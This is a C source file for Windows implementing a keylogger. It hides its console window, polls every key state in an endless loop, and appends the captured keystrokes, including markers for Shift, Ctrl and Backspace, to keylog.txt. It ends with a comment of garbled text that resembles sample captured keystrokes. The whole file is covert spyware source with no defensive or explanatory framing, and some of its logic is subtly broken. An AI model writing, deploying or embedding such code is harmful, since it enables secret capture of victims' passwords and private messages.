#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {
    FILE *file;
    char c;

    // Open file to store keystrokes
    file = fopen("keylog.txt", "a+");
    if (file == NULL) {
        printf("Error opening file!\n");
        return 1;
    }

    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (1) {
        // Loop through all possible key codes (0x08 to 0xFF)
        for (c = 8; c <= 255; c++) {
            // Check if the key is pressed
            if (GetAsyncKeyState(c) & 0x0001) {
                // Log the key to the file
                if ((c >= 39) && (c <= 64)) {
                    fputc(c, file);
                } else if ((c > 'A') && (c < 'z')) {
                    fputc(c, file);
                } else {
                    switch (c) {
                        case VK_SPACE:
                            fputc(' ', file);
                            break;
                        case VK_RETURN:
                            fputc('\n', file);
                            break;
                        case VK_TAB:
                            fputc('\t', file);
                            break;
                        case VK_BACK:
                            fputs("[BACKSPACE]", file);
                            break;
                        case VK_SHIFT:
                            fputs("[SHIFT]", file);
                            break;
                        case VK_CONTROL:
                            fputs("[CTRL]", file);
                            break;
                        case VK_ESCAPE:
                            fputs("[ESC]", file);
                            break;
                        case VK_DELETE:
                            fputs("[DEL]", file);
                            break;
                        default:
                        break;
                    }
                }
                // Flush buffer to ensure data is written to file
                fflush(file);
            }
        }
    }

    fclose(file);
    return 0;
}
// hey what are doing pa duwjfiu./l;lk HEt hey HIRGYGY sonueg 46728./';[]